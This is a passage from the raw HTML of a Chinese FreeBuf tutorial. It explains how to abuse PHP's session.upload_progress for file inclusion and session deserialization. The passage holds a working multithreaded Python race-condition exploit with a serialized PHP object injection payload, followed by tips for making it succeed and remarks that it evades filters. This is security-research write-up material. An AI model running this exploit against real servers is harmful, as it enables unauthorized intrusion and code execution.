style="color:rgb(119,0,136);">True</span>:</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">et</span>.<span class="cm-property" style="color:rgb(0,0,0);">wait</span>()</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">url</span> = <span class="cm-string" style="color:rgb(170,17,17);">\'http://\'</span><span class="cm-operator" style="color:rgb(152,26,26);">+</span><span class="cm-variable" style="color:rgb(0,0,0);">ip</span><span class="cm-operator" style="color:rgb(152,26,26);">+</span><span class="cm-string" style="color:rgb(170,17,17);">\':\'</span><span class="cm-operator" style="color:rgb(152,26,26);">+</span><span class="cm-builtin" style="color:rgb(51,0,170);">str</span>(<span class="cm-variable" style="color:rgb(0,0,0);">port</span>)<span class="cm-operator" style="color:rgb(152,26,26);">+</span><span class="cm-string" style="color:rgb(170,17,17);">\'/test5.php\'</span></span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">headers</span> = {</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:rgb(170,17,17);">\'User-Agent\'</span>: <span class="cm-string" style="color:rgb(170,17,17);">\'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\'</span>,</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:rgb(170,17,17);">\'Accept\'</span>: <span class="cm-string" style="color:rgb(170,17,17);">\'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\'</span>,</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:rgb(170,17,17);">\'Accept-Language\'</span>: <span class="cm-string" style="color:rgb(170,17,17);">\'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\'</span>,</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:rgb(170,17,17);">\'DNT\'</span>: <span class="cm-string" style="color:rgb(170,17,17);">\'1\'</span>,</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:rgb(170,17,17);">\'Cookie\'</span>: <span class="cm-string" style="color:rgb(170,17,17);">\'PHPSESSID=20190506\'</span>,</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:rgb(170,17,17);">\'Connection\'</span>: <span class="cm-string" style="color:rgb(170,17,17);">\'close\'</span>,</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:rgb(170,17,17);">\'Upgrade-Insecure-Requests\'</span>: <span class="cm-string" style="color:rgb(170,17,17);">\'1\'</span></span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span>}</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">proxy</span> = {</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:rgb(170,17,17);">\'http\'</span>: <span class="cm-string" style="color:rgb(170,17,17);">\'127.0.0.1:8080\'</span></span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span>}</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">data</span>={<span class="cm-string" style="color:rgb(170,17,17);">\'PHP_SESSION_UPLOAD_PROGRESS\'</span>:<span class="cm-string" style="color:rgb(170,17,17);">\'123\'</span>}</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">files</span>={</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:rgb(170,17,17);">\'file\'</span>:(<span class="cm-string" style="color:rgb(170,17,17);">r\'|O:4:\\"Door\\":1:{s:6:\\"handle\\";O:2:\\"IP\\":1:{s:2:\\"ip\\";s:10:\\"phpinfo();\\";}}\'</span>,<span class="cm-variable" style="color:rgb(0,0,0);">f</span>,<span class="cm-string" style="color:rgb(170,17,17);">\'text/plain\'</span>)</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span>}</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">resp</span> = <span class="cm-variable" style="color:rgb(0,0,0);">requests</span>.<span class="cm-property" style="color:rgb(0,0,0);">post</span>(<span class="cm-variable" style="color:rgb(0,0,0);">url</span>,<span class="cm-variable" style="color:rgb(0,0,0);">headers</span>=<span class="cm-variable" style="color:rgb(0,0,0);">headers</span>,<span class="cm-variable" style="color:rgb(0,0,0);">data</span>=<span class="cm-variable" style="color:rgb(0,0,0);">data</span>,<span class="cm-variable" style="color:rgb(0,0,0);">files</span>=<span class="cm-variable" style="color:rgb(0,0,0);">files</span>,<span class="cm-variable" style="color:rgb(0,0,0);">proxies</span>=<span class="cm-variable" style="color:rgb(0,0,0);">proxy</span>) <span class="cm-comment" style="color:rgb(170,85,0);">#,proxies=proxy</span></span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">resp</span>.<span class="cm-property" style="color:rgb(0,0,0);">encoding</span>=<span class="cm-string" style="color:rgb(170,17,17);">"utf-8"</span></span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-keyword" style="color:rgb(119,0,136);">if</span> <span class="cm-builtin" style="color:rgb(51,0,170);">len</span>(<span class="cm-variable" style="color:rgb(0,0,0);">resp</span>.<span class="cm-property" style="color:rgb(0,0,0);">text</span>)<span class="cm-operator" style="color:rgb(152,26,26);">&lt;</span><span class="cm-number" style="color:rgb(17,102,68);">2000</span>:</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-builtin" style="color:rgb(51,0,170);">print</span>(<span class="cm-string" style="color:rgb(170,17,17);">\'[+++++]retry\'</span>)</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-keyword" style="color:rgb(119,0,136);">else</span>:</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-builtin" style="color:rgb(51,0,170);">print</span>(<span class="cm-variable" style="color:rgb(0,0,0);">resp</span>.<span class="cm-property" style="color:rgb(0,0,0);">content</span>.<span class="cm-property" style="color:rgb(0,0,0);">decode</span>(<span class="cm-string" style="color:rgb(170,17,17);">\'utf-8\'</span>).<span class="cm-property" style="color:rgb(0,0,0);">encode</span>(<span class="cm-string" style="color:rgb(170,17,17);">\'utf-8\'</span>))</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">et</span>.<span class="cm-property" style="color:rgb(0,0,0);">clear</span>()</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-builtin" style="color:rgb(51,0,170);">print</span>(<span class="cm-string" style="color:rgb(170,17,17);">\'success!\'</span>)</span><br><span class="cm-tab-wrap-hack" style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span></span><br><span style="padding-right:.1px;"><span>​</span></span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">if</span> <span class="cm-variable" style="color:rgb(0,0,0);">__name__</span> == <span class="cm-string" style="color:rgb(170,17,17);">"__main__"</span>:</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">ip</span>=<span class="cm-variable" style="color:rgb(0,0,0);">sys</span>.<span class="cm-property" style="color:rgb(0,0,0);">argv</span>[<span class="cm-number" style="color:rgb(17,102,68);">1</span>]</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">port</span>=<span class="cm-builtin" style="color:rgb(51,0,170);">int</span>(<span class="cm-variable" style="color:rgb(0,0,0);">sys</span>.<span class="cm-property" style="color:rgb(0,0,0);">argv</span>[<span class="cm-number" style="color:rgb(17,102,68);">2</span>])</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">et</span>=<span class="cm-variable" style="color:rgb(0,0,0);">threading</span>.<span class="cm-property" style="color:rgb(0,0,0);">Event</span>()</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-keyword" style="color:rgb(119,0,136);">for</span> <span class="cm-variable" style="color:rgb(0,0,0);">i</span> <span class="cm-keyword" style="color:rgb(119,0,136);">in</span> <span class="cm-variable" style="color:rgb(0,0,0);">xrange</span>(<span class="cm-number" style="color:rgb(17,102,68);">1</span>,<span class="cm-number" style="color:rgb(17,102,68);">40</span>):</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">threading</span>.<span class="cm-property" style="color:rgb(0,0,0);">Thread</span>(<span class="cm-variable" style="color:rgb(0,0,0);">target</span>=<span class="cm-variable" style="color:rgb(0,0,0);">exp</span>,<span class="cm-variable" style="color:rgb(0,0,0);">args</span>=(<span class="cm-variable" style="color:rgb(0,0,0);">ip</span>,<span class="cm-variable" style="color:rgb(0,0,0);">port</span>)).<span class="cm-property" style="color:rgb(0,0,0);">start</span>()</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">et</span>.<span class="cm-property" style="color:rgb(0,0,0);">set</span>()</span><br><span style="padding-right:.1px;"><span>​</span></span></code></pre><p>首先在代码里加个代理，利用burp抓包。如下图</p><p><img alt="利用session.upload_progress进行文件包含和反序列化渗透" src="https://image.3001.net/images/20190506/1557146875_5cd02cfb01b9e.png!small" height="283" width="690"></p><p>这里有几个注意点：</p><blockquote>    <p>PHPSESSID必须要有，因为要竞争同一个文件</p>    <p>filename可控，但是在值的最前面加上<code>|</code>,因为最终目的是利用session的反序列化，<code>PHP_SESSION_UPLOAD_PROGRESS</code>只是个跳板。其次把字符串中的双引号转义，以防止与最外层的双引号冲突</p>    <p>上传的文件要大些，否则很难竞争成功。我写入是这么大<code>f = io.BytesIO(b\'a\' * 1024 *1024*1)</code></p>    <p>filename值中出现汉字时，会出错，所以在利用脚本前，<a href="https://blog.csdn.net/iriszx999/article/details/82113521">一定要修改python源码</a></p></blockquote><p>最后把<code>exp.py</code>中的代理去掉，直接跑<code>exp.py</code>,效果如下。</p><p><img alt="利用session.upload_progress进行文件包含和反序列化渗透" src="https://image.3001.net/images/20190506/1557146899_5cd02d139da64.png!small" height="267" width="690"></p><h3>几次失败尝试</h3><blockquote>    <p>其实，利用burp抓到<code>exp.py</code><span style="color: rgb(51, 51, 51);">流量后，可以直接在burp爆破，但貌似数据包数据有点多，导致burp反应很慢，最终失败。</span></p>    <p>另外，我尝试伪造<code>PHP_SESSION_UPLOAD_PROGRESS</code><span style="color: rgb(51, 51, 51);">的值，但是值中一旦出现</span><code>|</code><span style="color: rgb(51, 51, 51);">，将会导致数据写入session文件失败。</span></p></blockquote><h3>小结</h3><p>利用条件主要是存在session反序列化漏洞。</p><p>从文件包含和反序列化两个利用点，可以发现，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>可以绕过大部分过滤，而且传输的数据也不易发现。</p><h2>最后</h2><p>我还是一枚小萌新，文章中有不对的地方，还请各位大佬们指正，非常感谢，嘻嘻嘻。</p><p><span style="color: rgb(159, 163, 168);"><b>*本文作者：17851220695，转载请注明来自FreeBuf.COM</b></span></p>',is_original:s,is_reward:!0,is_reproduce:s,post_list:[]},serverMemuRender:s}],fetch:[],error:null,state:{counter:0,userInfo:{userInfo:{},skinData:{skin:"classical",vip:s,vip_time:""},dynamicCount:"",columnNumber:"",keyAuth:"",messageCount:{},isParty:s,guestRemind:s}},serverRendered:!0,routePath:"/vuls/202819.html"}}(!1,"TGAO")</script><script src="https://www.freebuf.com/freebuf/2.1.0.f2bddb9b2047fee49046.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.9b4235960ae0c2cc9600.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.32658a830f395d50ed89.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.a53ea8b00779fcef0fe8.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.e258e4cfb199b83189c6.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.927944ae29787a1b414f.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.02cf93cfce14e2557064.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.d38dc245ca9b7dd8571d.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.2ce4e8f001d4b2b67fbb.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.627b1661cc29c3e32429.js" defer></script>
</body>
<script>var _hmt=_hmt||[];_hmt.push(["_setAccount","cc53db168808048541c6735ce30421f5"]),function(){var c=document.createElement("script");c.src="https://hm.baidu.com/hm.js?cc53db168808048541c6735ce30421f5";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(c,e)}()</script>
</html>
